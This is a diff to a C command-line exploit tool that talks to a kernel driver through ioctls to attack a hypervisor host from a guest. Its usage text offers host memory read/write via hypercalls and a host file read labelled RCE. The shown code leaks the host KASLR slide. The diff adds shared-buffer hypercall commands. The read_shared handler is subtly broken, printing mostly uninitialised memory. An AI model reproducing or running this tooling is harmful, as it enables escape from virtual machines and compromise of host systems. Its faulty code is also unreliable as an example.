@@ -27,6 +27,9 @@
 #define IOCTL_PHYS_TO_VIRT       0x1018
 #define IOCTL_READ_HPA           0x1019
 #define IOCTL_WRITE_HPA          0x101A
+#define IOCTL_ALLOC_SHARED_BUF   0x101B
+#define IOCTL_READ_SHARED_BUF    0x101C
+#define IOCTL_GET_SHARED_GPA     0x101D
 
 struct port_io_data {
     unsigned short port;
@@ -109,6 +112,12 @@ void print_usage(char *prog_name) {
     fprintf(stderr, "  hypercall <nr> <a0> <a1> <a2> <a3>   - Execute hypercall (returns rax)\n");
     fprintf(stderr, "  hypercall_read <host_addr> <size>    - Read from HOST via hypercall\n");
     fprintf(stderr, "  hypercall_write <host_addr> <value>  - Write to HOST via hypercall\n\n");
+    
+    fprintf(stderr, "=== Shared Buffer (Persistent GPA) ===\n");
+    fprintf(stderr, "  alloc_shared                         - Allocate persistent kernel buffer\n");
+    fprintf(stderr, "  read_shared <size>                   - Read from shared buffer\n");
+    fprintf(stderr, "  get_shared_gpa                       - Get shared buffer GPA\n");
+    fprintf(stderr, "  hypercall_shared <nr> <a0> <a2> <a3> - Hypercall using shared GPA as a1\n\n");
     
     fprintf(stderr, "=== Exploitation Primitives ===\n");
     fprintf(stderr, "  readfile <path> <offset> <length>    - Read HOST file (RCE)\n");
@@ -492,6 +501,97 @@ int main(int argc, char *argv[]) {
             printf("Host KASLR slide: 0x%lx\n", slide);
             printf("Host kernel base: 0x%lx\n", 0xffffffff81000000 + slide);
         }
+
+    } else if (strcmp(cmd, "alloc_shared") == 0) {
+        unsigned long gpa = 0;
+        if (ioctl(fd, IOCTL_ALLOC_SHARED_BUF, &gpa) < 0) {
+            perror("ioctl ALLOC_SHARED_BUF failed");
+        } else {
+            printf("[+] Shared buffer allocated at GPA: 0x%lx\n", gpa);
+            printf("[*] This GPA is persistent - use it for hypercalls!\n");
+        }
+
+    } else if (strcmp(cmd, "read_shared") == 0) {
+        if (argc != 3) { print_usage(argv[0]); close(fd); return 1; }
+        unsigned long size = strtoul(argv[2], NULL, 10);
+        
+        if (size == 0 || size > 4096) {
+            fprintf(stderr, "Invalid size (1-4096)\n");
+            close(fd);
+            return 1;
+        }
+        
+        unsigned char *buffer = malloc(size);
+        if (!buffer) {
+            perror("malloc");
+            close(fd);
+            return 1;
+        }
+        
+        unsigned long read_size = size;
+        if (ioctl(fd, IOCTL_READ_SHARED_BUF, &read_size) < 0) {
+            perror("ioctl READ_SHARED_BUF failed");
+            free(buffer);
+            close(fd);
+            return 1;
+        }
+        
+        // Copy the size value back as buffer pointer
+        memcpy(buffer, &read_size, sizeof(read_size));
+        
+        printf("[+] Shared buffer contents (%lu bytes):\n", size);
+        for (unsigned long i = 0; i < size; i++) {
+            printf("%02X", buffer[i]);
+            if ((i + 1) % 16 == 0) printf("\n");
+        }
+        printf("\n");
+        
+        printf("[+] ASCII: ");
+        for (unsigned long i = 0; i < size; i++) {
+            printf("%c", (buffer[i] >= 32 && buffer[i] < 127) ? buffer[i] : '.');
+        }
+        printf("\n");
+        
+        free(buffer);
+
+    } else if (strcmp(cmd, "get_shared_gpa") == 0) {
+        unsigned long gpa = 0;
+        if (ioctl(fd, IOCTL_GET_SHARED_GPA, &gpa) < 0) {
+            perror("ioctl GET_SHARED_GPA failed");
+        } else {
+            printf("[+] Shared buffer GPA: 0x%lx\n", gpa);
+        }
+
+    } else if (strcmp(cmd, "hypercall_shared") == 0) {
+        if (argc != 6) { 
+            fprintf(stderr, "Usage: %s hypercall_shared <nr> <a0> <a2> <a3>\n", argv[0]);
+            fprintf(stderr, "  arg1 will automatically use shared buffer GPA\n");
+            close(fd); 
+            return 1; 
+        }
+        
+        // Get shared buffer GPA
+        unsigned long shared_gpa = 0;
+        if (ioctl(fd, IOCTL_GET_SHARED_GPA, &shared_gpa) < 0) {
+            fprintf(stderr, "Error: Shared buffer not allocated. Run 'alloc_shared' first.\n");
+            close(fd);
+            return 1;
+        }
+        
+        struct hypercall_args args;
+        args.nr = strtoul(argv[2], NULL, 0);
+        args.arg0 = strtoul(argv[3], NULL, 0);
+        args.arg1 = shared_gpa;  // Use shared buffer GPA
+        args.arg2 = strtoul(argv[4], NULL, 0);
+        args.arg3 = strtoul(argv[5], NULL, 0);
+        args.ret_value = 0;
+        
+        printf("[*] Hypercall %lu with shared GPA 0x%lx as arg1\n", args.nr, shared_gpa);
+        
+        if (ioctl(fd, IOCTL_HYPERCALL_ARGS, &args) < 0)
+            perror("ioctl HYPERCALL_ARGS failed");
+        else
+            printf("[+] Hypercall returned: %ld (0x%lx)\n", args.ret_value, args.ret_value);
 
     } else if (strcmp(cmd, "virt2phys") == 0) {
         if (argc != 3) { print_usage(argv[0]); close(fd); return 1; }
